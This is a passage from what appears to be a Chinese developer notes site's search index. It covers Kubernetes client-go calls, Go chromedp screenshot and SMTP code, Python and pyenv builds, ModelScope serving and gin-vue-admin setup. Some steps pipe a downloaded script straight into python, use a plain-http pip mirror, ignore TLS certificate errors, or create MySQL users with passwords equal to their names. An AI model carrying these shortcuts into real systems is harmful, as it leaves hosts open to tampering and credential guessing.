clientset.CoreV1().Pods(&lt;namespace&gt;).Create(&lt;pod&gt;)\n//\u66f4\u65b0pod\npod, err := clientset.CoreV1().Pods(&lt;namespace&gt;).Update(&lt;pod&gt;)\n//\u5220\u9664pod\nerr := clientset.CoreV1().Pods(&lt;namespace&gt;).Delete(&lt;pod.Name&gt;, &amp;meta_v1.DeleteOptions{})\n//\u67e5\u8be2pod\npod, err := clientset.CoreV1().Pods(&lt;namespace&gt;).Get(&lt;pod.Name&gt;, meta_v1.GetOptions{})\n//\u5217\u51fapod\npodList, err := clientset.CoreV1().Pods(&lt;namespace&gt;).List(&amp;meta_v1.ListOptions{})\n//watch pod\nwatchInterface, err := clientset.CoreV1().Pods(&lt;namespace&gt;).Watch(&amp;meta_v1.ListOptions{})\n</code></pre>"},{"location":"dev/12-chromedp/","title":"chromedp","text":""},{"location":"dev/12-chromedp/#_1","title":"\u4e00\u3001\u4f7f\u7528\u5b9e\u4f8b","text":""},{"location":"dev/12-chromedp/#11-screengo","title":"1.1 screen.go","text":"screen.go<pre><code>package screen\n\nimport (\n    \"context\"\n    \"log\"\n    \"ops-report/pkg/config\"\n    \"os\"\n    \"sync\"\n    \"time\"\n\n    \"github.com/chromedp/cdproto/page\"\n    \"github.com/chromedp/chromedp\"\n)\n\nvar (\n    proxyAddr = \"ws://127.0.0.1:9222/\"\n    ctx       = context.Background()\n    once      sync.Once\n)\n\nfunc init() {\n    once.Do(func() {\n        log.Println(\"Init RemoteAllocator\")\n        if config.InCluster {\n            // ignore cancel()\n            // Setting Browser\n            opts := append(\n                chromedp.DefaultExecAllocatorOptions[:],\n                chromedp.DisableGPU,\n                chromedp.IgnoreCertErrors,\n                chromedp.Flag(\"headless\", false),\n            )\n\n            ctx, _ = chromedp.NewExecAllocator(ctx, opts...)\n\n            ctx, _ = chromedp.NewRemoteAllocator(ctx, proxyAddr)\n        }\n        ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))\n    })\n}\n\ntype screen struct {\n    Addr   string\n    Output string\n}\n\nfunc NewScreen(addr, output string) *screen {\n    return &amp;screen{addr, output}\n}\n\nfunc (s *screen) SetAddr(addr string) *screen {\n    s.Addr = addr\n    return s\n}\n\nfunc (s *screen) SetOutput(output string) *screen {\n    s.Output = output\n    return s\n}\n\nfunc (s *screen) PDF() error {\n    var buf []byte\n    if err := chromedp.Run(ctx,\n        chromedp.Navigate(s.Addr),\n        chromedp.ActionFunc(func(ctx context.Context) error {\n            var err error\n            buf, _, err = page.PrintToPDF().WithPrintBackground(false).Do(ctx)\n            if err != nil {\n                return err\n            }\n            return nil\n        }),\n    ); err != nil {\n        return err\n    }\n\n    if err := os.WriteFile(s.Output, buf, 0644); err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (s *screen) Full() error {\n    var buf []byte\n    if err := chromedp.Run(ctx,\n        chromedp.Navigate(s.Addr),\n        chromedp.FullScreenshot(&amp;buf, 90),\n    ); err != nil {\n        return err\n    }\n\n    if err := os.WriteFile(s.Output, buf, 0644); err != nil {\n        return err\n    }\n    return nil\n}\n\nfunc (s *screen) Area(selector string, height int64) error {\n    var buf []byte\n    if err := chromedp.Run(ctx,\n        chromedp.Navigate(s.Addr),\n        chromedp.Sleep(time.Second*10),\n        chromedp.EmulateViewport(0, height),\n        chromedp.Screenshot(selector, &amp;buf),\n    ); err != nil {\n        log.Fatal(err)\n    }\n\n    if err := os.WriteFile(s.Output, buf, 0o644); err != nil {\n        log.Fatal(err)\n    }\n\n    return nil\n}\n</code></pre>"},{"location":"dev/12-chromedp/#12-screen_testgo","title":"1.2 screen_test.go","text":"screen_test.go<pre><code>package screen_test\n\nimport (\n    \"ops-report/pkg/screen\"\n    \"testing\"\n\n    \"github.com/stretchr/testify/assert\"\n)\n\nfunc TestPDF(t *testing.T) {\n    s := screen.NewScreen(\n        \"https://books.8ops.top\",\n        \"/Users/jesse/Downloads/books.pdf\",\n    )\n\n    err := s.PDF()\n\n    if assert.NoError(t, err) {\n        t.Logf(\"Output [%s]\", s.Output)\n    }\n}\n\nfunc TestFull(t *testing.T) {\n    s := screen.NewScreen(\n        \"https://books.8ops.top\",\n        \"/Users/jesse/Downloads/books.jpeg\",\n    )\n\n    err := s.Full()\n\n    if assert.NoError(t, err) {\n        t.Logf(\"Output [%s]\", s.Output)\n    }\n}\n\nfunc TestArea(t *testing.T) {\n    // books\n    s := screen.NewScreen(\n        \"https://books.8ops.top\",\n        \"/Users/jesse/Downloads/books.png\",\n    )\n    err := s.Area(\"/html/body\", 0)\n    if assert.NoError(t, err) {\n        t.Logf(\"Output [%s]\", s.Output)\n    }\n\n    s.SetOutput(\"/Users/jesse/Downloads/books-inner.png\")\n    err = s.Area(\"div.md-main__inner\", 1200)\n    if assert.NoError(t, err) {\n        t.Logf(\"Output [%s]\", s.Output)\n    }\n}\n</code></pre>"},{"location":"dev/12-chromedp/#_2","title":"\u4e8c\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"dev/12-chromedp/#21-linuxdockergoogle-chromedp","title":"2.1 linux\u6216docker\u4e0b\u8fd0\u5c11\u7f3a\u5c11google-chromedp","text":"<pre><code># \u91c7\u7528 RemoteAllocator\ndocker run -d -p 9222:9222 --rm --name headless-shell chromedp/headless-shell:114.0.5720.4\n</code></pre>"},{"location":"dev/12-chromedp/#22-remoteallocator","title":"2.2 \u91c7\u7528RemoteAllocator\u622a\u5c4f\u65f6\u4e2d\u6587\u4e71\u7801","text":"<pre><code># \u539f\u56e0\u662f\u7f3a\u5c11\u4e2d\u6587\u5b57\u4f53\napt-get install -y ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy #(1)\n</code></pre> <ol> <li>\u9ed8\u8ba4\u955c\u50cf\u4f7f\u7528\u7684 debian</li> </ol>"},{"location":"dev/12-chromedp/#23-err_cert_authority_invalid","title":"2.3 \u8bbf\u95ee\u79c1\u6709\u8bc1\u4e66\u7f51\u7ad9\u62a5ERR_CERT_AUTHORITY_INVALID","text":"<pre><code># TODO\n</code></pre>"},{"location":"dev/13-smtp/","title":"smtp","text":""},{"location":"dev/13-smtp/#_1","title":"\u4e00\u3001\u5b9e\u4f8b\u4ee3\u7801","text":""},{"location":"dev/13-smtp/#11-emailgo","title":"1.1 email.go","text":"email.go<pre><code>package email\n\nimport (\n    \"fmt\"\n    \"strings\"\n\n    \"gopkg.in/gomail.v2\"\n)\n\ntype TextType int\n\nconst (\n    TEXT TextType = iota\n    HTML\n    IMAGE\n)\n\ntype email struct {\n    NickName   string\n    UserName   string\n    Passport   string\n    Host       string\n    Port       int\n    TO         []string\n    CC         []string\n    AttachMent []string\n    ImageView  struct {\n        Header string\n        Footer string\n        Source string\n        Link   string\n    }\n    Type TextType\n}\n\nfunc NewEmail() *email { return &amp;email{} }\n\nfunc (e *email) SetNickName(nickname string) *email {\n    e.NickName = nickname\n    return e\n}\n\nfunc (e *email) SetUserName(username string) *email {\n    e.UserName = username\n    return e\n}\n\nfunc (e *email) SetPassport(passport string) *email {\n    e.Passport = passport\n    return e\n}\n\nfunc (e *email) SetHost(host string) *email {\n    e.Host = host\n    return e\n}\n\nfunc (e *email) SetPort(port int) *email {\n    e.Port = port\n    return e\n}\n\nfunc (e *email) SetTo(to ...string) *email {\n    e.TO = to\n    return e\n}\n\nfunc (e *email) SetCC(cc ...string) *email {\n    e.CC = cc\n    return e\n}\n\nfunc (e *email) SetAttachMent(attach ...string) *email {\n    e.AttachMent = attach\n    return e\n}\n\nfunc (e *email) SetImageView(header, footer, source, link string) *email {\n    e.ImageView.Header = header\n    e.ImageView.Footer = footer\n    e.ImageView.Source = source\n    e.ImageView.Link = link\n    return e\n}\n\nfunc (e *email) SetType(typ TextType) *email {\n    e.Type = typ\n    return e\n}\n\nfunc (e *email) Send(subject, content string) error {\n    m := gomail.NewMessage()\n    m.SetHeader(\"From\", m.FormatAddress(e.UserName, e.NickName))\n    m.SetHeader(\"To\", e.TO...)\n    m.SetHeader(\"Cc\", e.CC...)\n    m.SetHeader(\"Subject\", subject)\n\n    switch typ := e.Type; typ {\n    case HTML:\n        m.SetBody(\"text/html\", content)\n    case IMAGE:\n        m.Embed(e.ImageView.Source)\n        embedNameS := strings.Split(e.ImageView.Source, \"/\")\n        embedName := embedNameS[len(embedNameS)-1]\n        body := fmt.Sprintf(`%s&lt;br/&gt;\n            %s&lt;br/&gt;\n            &lt;a href=\"%s\" &gt;\n            &lt;img src=\"cid:%s\" alt=\"%s\" /&gt;\n            &lt;/a&gt;\n            &lt;br/&gt;%s\n            `,\n            e.ImageView.Header,\n            content,\n            e.ImageView.Link,\n            embedName, embedName,\n            e.ImageView.Footer,\n        )\n        m.SetBody(\"text/html\", body)\n    default:\n        m.SetBody(\"text/plain\", content)\n    }\n\n    for _, attach := range e.AttachMent {\n        m.Attach(attach)\n    }\n\n    d := gomail.NewDialer(e.Host, e.Port, e.UserName, e.Passport)\n\n    if err := d.DialAndSend(m); err != nil {\n        return err\n    }\n\n    return nil\n}\n</code></pre>"},{"location":"dev/13-smtp/#12-email_testgo","title":"1.2 email_test.go","text":"email_test.go<pre><code>package email_test\n\nimport (\n    \"ops-report/pkg/config\"\n    \"ops-report/pkg/email\"\n    \"testing\"\n    \"time\"\n\n    \"github.com/stretchr/testify/assert\"\n)\n\nvar e = email.NewEmail()\n\nfunc init() {\n    conf := config.Conf\n\n    e.SetNickName(conf.Email.NickName).\n        SetUserName(conf.Email.UserName).\n        SetPassport(conf.Email.Passport).\n        SetHost(conf.Email.Host).\n        SetPort(conf.Email.Port).\n        SetTo(conf.Email.TO...).\n        SetCC(conf.Email.CC...).\n        SetAttachMent(conf.Email.AttachMent...)\n}\n\nfunc TestSendTEXT(t *testing.T) {\n    var (\n        subject = \"\u3010\u6587\u672c\u62a5\u544a\u3011This is Subject - \" + time.Now().Format(\"20060201150405\")\n        content = \"&lt;h1&gt;This is Content&lt;/h1&gt;\"\n    )\n\n    err := e.Send(subject, content)\n    if assert.NoError(t, err); err != nil {\n        t.Logf(\"Send OK.\")\n    }\n}\nfunc TestSendHTML(t *testing.T) {\n    var (\n        subject = \"\u3010\u7f51\u9875\u62a5\u544a\u3011This is Subject - \" + time.Now().Format(\"20060201150405\")\n        content = \"&lt;h2&gt;This is Content&lt;/h2&gt;\"\n    )\n\n    e.SetType(email.HTML)\n    err := e.Send(subject, content)\n    if assert.NoError(t, err); err != nil {\n        t.Logf(\"Send OK.\")\n    }\n}\n\nfunc TestSendIMAGE(t *testing.T) {\n    var (\n        subject = \"\u3010\u56fe\u8868\u62a5\u544a\u3011This is Subject - \" + time.Now().Format(\"20060201150405\")\n        content = \"&lt;h2&gt;This is Content&lt;/h2&gt;\"\n    )\n\n    e.SetType(email.IMAGE).\n        SetAttachMent(\"/Users/jesse/Downloads/books.png\").\n        SetImageView(\"HEADER\", \"FOOTER\", \"/Users/jesse/Downloads/books.png\", \"https://books.8ops.top\")\n    err := e.Send(subject, content)\n    if assert.NoError(t, err); err != nil {\n        t.Logf(\"Send OK.\")\n    }\n}\n</code></pre>"},{"location":"dev/13-smtp/#_2","title":"\u4e8c\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"dev/13-smtp/#21","title":"2.1 \u6284\u9001\u5931\u8d25","text":"<pre><code># \u5fc5\u987b\u8bbe\u7f6eHeader's Cc   \n    m.SetHeader(\"Cc\", e.CC...)\n</code></pre>"},{"location":"dev/20-python/","title":"python","text":""},{"location":"dev/20-python/#_1","title":"\u4e00\u3001\u7f16\u8bd1\u7b14\u8bb0","text":""},{"location":"dev/20-python/#11","title":"1.1 \u7f16\u8bd1\u8fc7\u7a0b","text":"<pre><code># \u6ce8\u610f\u987a\u5e8f\u8fd9\u4e2a\u5148\u88c5\uff0c\u5426\u5219\u540e\u9762\u5b89\u88c5\u89e3\u538b\u65f6python\u51fa\u9519\nyum install zlib zlib-devel\nwget --no-check-certificate https://www.python.org/ftp/python/2.7.12/Python-2.7.12.tgz\ntar xvzf Python-2.7.12.tgz \ncd Python-2.7.12\n./configure --prefix=/usr/local/python\nmake &amp;&amp; make install\n\n# \u9700\u8981\u6ce8\u610fyum; which yum\ncat &gt; /etc/profile.d/sqlite3-env.sh &lt;&lt; EOF\nexport SQLITE3_HOME=/usr/local/sqlite3\nexport PATH=${SQLITE3_HOME}/bin:$PATH\nEOF\nsource /etc/profile\necho $PATH\nwhich python\n\nwget https://bootstrap.pypa.io/ez_setup.py -O - | python\neasy_install pip\neasy_install pymongo\neasy_install redis\neasy_install simplejson\n\n# CentOS7.0 or Ubuntu \u9700\u8981\u6ce8\u610f\u7279\u6b8a\u60c5\u51b5\nyum install -y mysql-devel.x86_64\neasy_install MySQL-python\n\n# \u914d\u7f6e\u56fd\u5185\u7684\u6e90\nmkdir -p ~/.pip\ncat &gt; ~/.pip/pip.conf &lt;&lt;EOF\n[global]  \nindex-url=http://mirrors.aliyun.com/pypi/simple\nEOF\n\n# \u9047\u5230\u201cImportError: No module named _sqlite3\u201d\u95ee\u9898\u3002\n# \u89e3\u51b3\u529e\u6cd5\uff1a\u9700\u5148\u7f16\u8bd1sqlite3.\nwget http://www.sqlite.org/sqlite-amalgamation-3.6.20.tar.gz\ntar zxvf  sqlite-amalgamation-3.6.20.tar.gz\ncd  sqlite-3.5.6\n./configure \u2013prefix=/usr/local/sqlite3\nmake &amp;&amp; make install  #(\u8fd9\u6837\uff0csqlite3\u7f16\u8bd1\u5b8c\u6210\uff09\n\n# \u518d\u6765\u7f16\u8bd1python2.7.12:\nwget http://python.org/ftp/python/2.7.12/Python-2.7.12.tar.xz\nxz -d Python-2.7.12.tar.xz\ntar xf  Python-2.7.12.tar\n\n# \u5148\u4fee\u6539Python-2.7.12\u76ee\u5f55\u91cc\u7684setup.py \u6587\u4ef6\uff1a\ncd  Python-2.7.12\nsqlite_inc_paths = [ \u2018/usr/include\u2019,\n     \u2018/usr/include/sqlite\u2019,\n     \u2018/usr/include/sqlite3\u2019,\n     \u2018/usr/local/include\u2019,\n     \u2018/usr/local/include/sqlite\u2019,\n     \u2018/usr/local/include/sqlite3\u2019,\n     \u2018/usr/local/lib/sqlite3/include\u2019,\n     \u2018/usr/local/sqlite3/include\u2019, # \u6dfb\u52a0\u6b64\u884c\n\n./configure --prefix=/usr/local/python\nmake &amp;&amp; make install  #\uff08\u8fd9\u6837\uff0cpython2.7.12\u7f16\u8bd1\u5b8c\u6210\uff0c\u89e3\u51b3sqlite3\u5bfc\u5165\u51fa\u9519\u7684\u95ee\u9898\uff09\n\nyum install -y -q libxslt-devel\npip install lxml\n\nyum install -y zlib zlib-dev openssl-devel sqlite-devel bzip2-devel libffi libffi-devel gcc gcc-c++\n\nyum install xz-devel mesa-libGL python-backports-lzma\n</code></pre> <p><code>2.x.x</code>\u6ce8\u5b9a\u88ab\u65f6\u4ee3\u6dd8\u6c70\uff0c<code>3.x.x</code>\u5927\u52bf\u6240\u8d8b</p> <p>\u5e38\u7528\u5b89\u88c5\u65b9\u5f0f</p> <ul> <li>\u7f16\u8bd1\u5b89\u88c5</li> <li>virtual</li> <li>pyenv</li> </ul>"},{"location":"dev/20-python/#12-openssl","title":"1.2 \u5b89\u88c5 openssl","text":"<p>\u53ef\u9009 install 1.1.1o</p> <p>\u53e6\u53c2\u8003 3.2.0</p> <pre><code># openssl \u7248\u672c\u8fc7\u4f4e\n# Installing Python-3.10.2...\n# ERROR: The Python ssl extension was not compiled. Missing the OpenSSL lib?\n\n# 1.\u4e0b\u8d3copenssl\nOPENSSL_VERSION=1.1.1o\nwget https://www.openssl.org/source/openssl-${OPENSSL_VERSION}.tar.gz\ntar -zxvf openssl-${OPENSSL_VERSION}.tar.gz\ncd openssl-${OPENSSL_VERSION}\n\n# 2.\u7f16\u8bd1\u5b89\u88c5\n./config --prefix=/usr/local/openssl no-zlib #\u4e0d\u9700\u8981zlib\nmake &amp;&amp; make install\n\n# 3.\u5907\u4efd\u539f\u914d\u7f6e\nmv /usr/bin/openssl /usr/bin/openssl.bak\nmv /usr/include/openssl/ /usr/include/openssl.bak\n\n# 4.\u65b0\u7248\u914d\u7f6e\nln -s /usr/local/openssl/include/openssl /usr/include/openssl\nln -s /usr/local/openssl/lib/libssl.so.1.1 /usr/local/lib64/libssl.so\nln -s /usr/local/openssl/bin/openssl /usr/bin/openssl\n\n# 5.\u4fee\u6539\u7cfb\u7edf\u914d\u7f6e\n## \u5199\u5165openssl\u5e93\u6587\u4ef6\u7684\u641c\u7d22\u8def\u5f84\necho \"/usr/local/openssl/lib\" &gt;&gt; /etc/ld.so.conf.d/openssl-x86_64.conf\n## \u4f7f\u4fee\u6539\u540e\u7684/etc/ld.so.conf\u751f\u6548 \nldconfig -v\n\n# 6.\u67e5\u770bopenssl\u7248\u672c\nopenssl version\n\n# 7.\u73af\u5883\u52a0\u8f7dlib\nLD_RUN_PATH=\"/usr/local/openssl/lib\" \\\nLDFLAGS=\"-L/usr/local/openssl/lib\" \\\nCPPFLAGS=\"-I/usr/local/openssl/include\" \\\nCFLAGS=\"-I/usr/local/openssl/include\" \\\nCONFIGURE_OPTS=\"--with-openssl=/usr/local/openssl\" \n</code></pre> <p>\u8865\u5145</p> <pre><code># \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u89e3\u51b3\u4e0a\u9762\u7684\u9519\u8bef\uff1a\n# CentOS\nsudo ln -s /usr/local/lib64/libssl.so.1.1 /usr/lib64/\nsudo ln -s /usr/local/lib64/libcrypto.so.1.1 /usr/lib64/\n# \u5728 Ubuntu \u4e0a\u4e5f\u66f4\u65b0\u4e86 OpenSSL\uff0c\u8fd9\u91cc\u7684\u547d\u4ee4\u6709\u4e9b\u4e0d\u4e00\u6837\uff1a\n\nsudo ln -s /usr/local/lib/libcrypto.so.1.1 /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1\nsudo ln -s /usr/local/lib/libssl.so.1.1 /usr/lib/x86_64-linux-gnu/libssl.so.1.1\n</code></pre>"},{"location":"dev/20-python/#_2","title":"\u4e8c\u3001\u7f16\u8bd1\u5b89\u88c5","text":"<pre><code>./configure --prefix=/usr/local/python-3.8.4 --enable-optimizations --with-openssl=/usr/local/openssl\nmake &amp;&amp; make install\n</code></pre>"},{"location":"dev/20-python/#_3","title":"\u4e09\u3001\u865a\u62df\u73af\u5883","text":"<p><code>cache</code>\u63d0\u524d\u4e0b\u8f7d<code>Python-xx.tar.xz</code>\u81f3<code>~/.pyenv/cache/</code></p> <p>\u53ef\u9009</p>"},{"location":"dev/20-python/#31-pyenv","title":"3.1 pyenv","text":"<p>Reference</p> <pre><code># 1.\u4e0b\u8f7dpyenv\nrm -rf ~/.pyenv\nPYENV_VERSION=v2.3.22\ncurl -s -o /tmp/pyenv-${PYENV_VERSION}.tar.gz https://github.com/pyenv/pyenv/archive/refs/tags/${PYENV_VERSION}.tar.gz\ntar xzf /tmp/pyenv-${PYENV_VERSION}.tar.gz\nmv pyenv-${PYENV_VERSION} ~/.pyenv\n\n# 2.\u521d\u59cbpyenv\u73af\u5883\ngrep -q PYENV_ROOT ~/.profile | cat &gt;&gt; ~/.profile &lt;&lt;EOF\nexport PYENV_ROOT=\"~/.pyenv\"\nexport PATH=\"\\${PYENV_ROOT}/bin:\\$PATH\"\neval \"\\$(pyenv init --path)\"\nEOF\n\ngrep -q PYENV_ROOT ~/.bashrc | cat &gt;&gt; ~/.bashrc &lt;&lt;EOF\nexport PYENV_ROOT=\"~/.pyenv\"\nexport PATH=\"\\${PYENV_ROOT}/bin:\\$PATH\"\neval \"\\$(pyenv init --path)\"\nEOF\n\n. ~/.bashrc\n\n# view pyenv version\npyenv --version\n\n# view install python versions\npyenv versions\n\n# view support python versions\npyenv install --list\n\nPYTHON_VERSION=3.12.4\n# \u82e5\u9047\u5230 ModuleNotFoundError: No module named '_ssl'\u95ee\u9898\nLD_RUN_PATH=\"/usr/local/openssl/lib64\" \\\nLDFLAGS=\"-L/usr/local/openssl/lib64\" \\\nCPPFLAGS=\"-I/usr/local/openssl/include\" \\\nCFLAGS=\"-I/usr/local/openssl/include\" \\\nCONFIGURE_OPTS=\"--with-openssl=/usr/local/openssl \" pyenv install ${PYTHON_VERSION}\n</code></pre>"},{"location":"dev/20-python/#32-python","title":"3.2 python","text":"<p>Reference</p> <pre><code>PYTHON_VERSION=3.12.4\nmkdir -p ~/.pyenv/cache\ncurl -s -o ~/.pyenv/cache/Python-${PYTHON_VERSION}.tar.xz https://m.8ops.top/python/Python-${PYTHON_VERSION}.tar.xz\n\n# ubuntu's install require package\napt install -y gcc make binutils build-essential zlib1g-dev \\\n    libffi-dev libbz2-dev  libsqlite3-dev \\\n    libreadline-dev lib64readline-dev libncurses5-dev libncursesw5-dev libssl-dev \n\n## centos's install require package\nyum install gcc gcc-c++ autoconf automake binutils \\\n    make cmake wget openssl-devel libsqlite3x libffi-devel \\\n    httpd-devel libsqlite3x-devel ncurses-devel \\\n    bzip2-devel bzip2-libs bzip2 readline-devel readline mod-wsgi xz xz-devel\n\npyenv install 3.10.2\n\n# \u63d0\u793a\u5efa\u8bae\u4f18\u5316\uff0c\u91cd\u65b0\u5b89\u88c5\u5373\u53ef\nMAKE_OPTS=\"-j8\" \\\nCONFIGURE_OPTS=\"--enable-shared --enable-optimizations --with-computed-gotos\" \\\nCFLAGS=\"-march=native -O2 -pipe\" \\\npyenv install -v ${PYTHON_VERSION}\n\n# \u53ef\u4ee5\u5b89\u88c5\u591a\u4e2a\u7248\u672c\u5728\u4e00\u4e2a\u7cfb\u7edf\u4e2d\uff0c\u9009\u62e9\u6307\u5b9a\u7248\u672c\u4e3a\u4f7f\u7528\u72b6\u6001\npyenv global ${PYTHON_VERSION}\n\nmkdir -p ~/.pip\ncat &gt; ~/.pip/pip.conf &lt;&lt;EOF\n[global]\nindex-url = https://mirrors.aliyun.com/pypi/simple/\n\n[install]\ntrusted-host=mirrors.aliyun.com\nEOF\n\npip install --upgrade pip\n</code></pre>"},{"location":"dev/20-python/#33-macbook","title":"3.3 MacBook","text":"<pre><code>mkdir -p ~/.pyenv/cache\n\nwget https://www.python.org/ftp/python/3.11.2/Python-3.11.2.tar.xz \\\n    -O ~/.pyenv/cache/Python-3.11.2.tar.xz \n\nenv \\\n  PATH=\"$(brew --prefix tcl-tk)/bin:$PATH\" \\\n  LDFLAGS=\"-L$(brew --prefix tcl-tk)/lib -L$(brew --prefix zlib)/lib -L$(brew --prefix bzip2)/lib\" \\\n  CPPFLAGS=\"-I$(brew --prefix tcl-tk)/include -L$(brew --prefix zlib)/include -L$(brew --prefix bzip2)/include\" \\\n  PKG_CONFIG_PATH=\"$(brew --prefix tcl-tk)/lib/pkgconfig\" \\\n  CFLAGS=\"-I$(brew --prefix tcl-tk)/include -I$(brew --prefix openssl)/include -I$(brew --prefix bzip2)/include -I$(brew --prefix zlib)/include -I$(brew --prefix readline)/include -I$(xcrun --show-sdk-path)/usr/include\" \\\n  LDFLAGS=\"-I$(brew --prefix tcl-tk)/lib -L$(brew --prefix openssl)/lib -L$(brew --prefix readline)/lib -L$(brew --prefix zlib)/lib -L$(brew --prefix bzip2)/lib\" \\\n  MAKE_OPTS=\"-j8\" \\\n  CC=gcc pyenv install -v 3.11.2\n</code></pre>"},{"location":"dev/20-python/#_4","title":"\u56db\u3001\u5e38\u7528\u6a21\u5757","text":"<p>Reference</p> <pre><code>python -m http.server 8000\n</code></pre>"},{"location":"dev/20-python/#_5","title":"\u4e94\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"dev/20-python/#51-configure-error","title":"5.1 configure: error","text":"<pre><code># # mac apple slice\n# checking for --with-universal-archs... no\n# checking MACHDEP... \"darwin\"\n# checking for xcrun... yes\n# checking macOS SDKROOT... /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk\n# checking for gcc... clang\n# checking whether the C compiler works... no\n# configure: error: in `/var/folders/0s/qm_x16j50gvdlbkdf6lkm_g80000gn/T/python-build.20231211141839.54923/Python-3.12.1':\n# configure: error: C compiler cannot create executables\n# See `config.log' for more details\n# make: *** No targets specified and no makefile found.  Stop.\n\n# method 1\nsoftwareupdate --all --install --force\n\n# method 2\nsudo rm -rf /Library/Developer/CommandLineTools\nsudo xcode-select --install\n\nbrew reinstall zlib bzip2\n\n# e.g.\n# CFLAGS=\"-I$(brew --prefix openssl)/include -I$(brew --prefix bzip2)/include -I$(brew --prefix readline)/include -I$(xcrun --show-sdk-path)/usr/include\" LDFLAGS=\"-L$(brew --prefix openssl)/lib -L$(brew --prefix readline)/lib -L$(brew --prefix zlib)/lib -L$(brew --prefix bzip2)/lib\" pyenv install --patch 3.8.0 &lt; &lt;(curl -sSL https://github.com/python/cpython/commit/8ea6353.patch\\?full_index\\=1)\n</code></pre>"},{"location":"dev/21-conda/","title":"conda","text":""},{"location":"dev/21-conda/#_1","title":"\u4e00\u3001\u5b89\u88c5\u73af\u5883","text":"<pre><code># https://developer.aliyun.com/article/1023567\nwget -c https://repo.anaconda.com/archive/Anaconda3-2023.09-0-MacOSX-x86_64.sh\nbash Anaconda3-2023.09-0-MacOSX-x86_64.sh\n\n# \u6784\u5efaShell\u73af\u5883\nconda create -n modelscope python=3.11.5\nconda activate modelscope\npip install torch torchvision torchaudio tensorflow\npip install setuptools_scm\npip install fairseq\n\n# \u5b89\u88c5modelscope nlp\u529f\u80fd\npip install \"modelscope[nlp]\" -f https://modelscope.oss-cn-beijing.aliyuncs.com/releases/repo.html\n\n# \u5b89\u88c5modelscope cv\u529f\u80fd\npip install \"modelscope[cv]\" -f https://modelscope.oss-cn-beijing.aliyuncs.com/releases/repo.html\n\n# \u6d4b\u8bd5\npython -c \"from modelscope.pipelines import pipeline;print(pipeline('word-segmentation')('\u5b89\u88c5modelscope'))\"\n</code></pre>"},{"location":"dev/21-conda/#_2","title":"\u4e8c\u3001\u90e8\u7f72\u6a21\u578b","text":"<pre><code>modelscope server --model_id=qwen/Qwen-7B-Chat --revision=v1.0.5\n\ndocker run -d --rm --name modelscope-chat -e MODELSCOPE_CACHE=/modelscope_cache -v /host_path_to_modelscope_cache:/modelscope_cache -p 8000:8000 registry.cn-beijing.aliyuncs.com/modelscope-repo/modelscope:ubuntu22.04-cuda11.8.0-py310-torch2.1.0-tf2.14.0-1.10.0 modelscope server --model_id=qwen/Qwen-7B-Chat --revision=v1.0.5\n\ndocker run -d --rm --name modelscope-chat --shm-size=50gb --gpus='\"device=0\"' -e MODELSCOPE_CACHE=/modelscope_cache -v /host_path_to_modelscope_cache:/modelscope_cache -p 8000:8000 registry.cn-beijing.aliyuncs.com/modelscope-repo/modelscope:ubuntu22.04-cuda11.8.0-py310-torch2.1.0-tf2.14.0-1.10.0 modelscope server --model_id=qwen/Qwen-7B-Chat --revision=v1.0.5\n</code></pre>"},{"location":"dev/70-admin/","title":"admin","text":""},{"location":"dev/70-admin/#_1","title":"\u4e00\u3001\u4f9d\u8d56\u51c6\u5907","text":"Addr Port User Pass db Redis 10.101.11.250 30389 MySQL 10.101.11.250 30380 gin_vue_admin gin_vue_admin gin_vue_admin MySQL 10.101.11.250 30380 go_admin go_admin go_admin <pre><code>create database gin_vue_admin;\ncreate user 'gin_vue_admin'@'%' identified by 'gin_vue_admin';\ngrant all privileges on gin_vue_admin.* to `gin_vue_admin`@`%`;\nflush privileges;\n\ncreate database go_admin;\ncreate user 'go_admin'@'%' identified by 'go_admin';\ngrant all privileges on go_admin.* to `go_admin`@`%`;\nflush privileges;\n</code></pre>"},{"location":"dev/70-admin/#_2","title":"\u4e8c\u3001\u811a\u624b\u67b6","text":"<p>\u4eab\u53d7\u793e\u533a\u529b\u91cf</p>"},{"location":"dev/70-admin/#21-gin-vue-admin","title":"2.1 gin-vue-admin","text":"<p>Reference</p>"},{"location":"dev/70-admin/#211-lanuch","title":"2.1.1 lanuch","text":"<pre><code>git clone https://github.com/flipped-aurora/gin-vue-admin.git\n\ncd gin-vue-admin/server\ngo build -o server main.go\n./server\n\ncd gin-vue-admin/web\nnpm i\nnpm run serve\n\n# vscode \u6253\u5f00 gin-vue-admin.code-workspace\n</code></pre>"},{"location":"dev/70-admin/#212-vue","title":"2.1.2 \u81ea\u5b9a\u4e49vue","text":"<pre><code>cat &gt; view/demo/index.vue &lt;&lt;EOF\n&lt;template&gt;\n  &lt;div&gt;\n  This is demo menu\n  &lt;/div&gt;\n&lt;/template&gt;\nEOF\n</code></pre>"},{"location":"dev/70-admin/#213","title":"2.1.3 \u4ee3\u7801\u81ea\u52a8\u751f\u6210","text":"<pre><code># \u521b\u5efa\u8868\ncreate table tb_demo(\n  `id` bigint unsigned NOT NULL AUTO_INCREMENT,\n  c_name varchar(20),\n  c_age int,\n  PRIMARY KEY (`id`)\n);\n\nshow create table tb_demo\\G;\nCreate Table: CREATE TABLE `tb_demo` (\n  `id` bigint unsigned NOT NULL AUTO_INCREMENT,\n  `c_name` varchar(20) COLLATE utf8mb4_general_ci DEFAULT NULL,\n  `c_age` int DEFAULT NULL,\n  `created_at` datetime(3) DEFAULT NULL,\n  `updated_at` datetime(3) DEFAULT NULL,\n  `deleted_at` datetime(3) DEFAULT NULL,\n  PRIMARY KEY (`id`),\n  KEY `idx_tb_demo_deleted_at` (`deleted_at`)\n) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci\n\n# \u4f1a\u81ea\u52a8migrate\n  `id` bigint unsigned NOT NULL AUTO_INCREMENT,\n  `created_at` datetime(3) DEFAULT NULL,\n  `updated_at` datetime(3) DEFAULT NULL,\n  `deleted_at` datetime(3) DEFAULT NULL,\n</code></pre> <p>Reference</p>"},{"location":"dev/70-admin/#214","title":"2.1.4 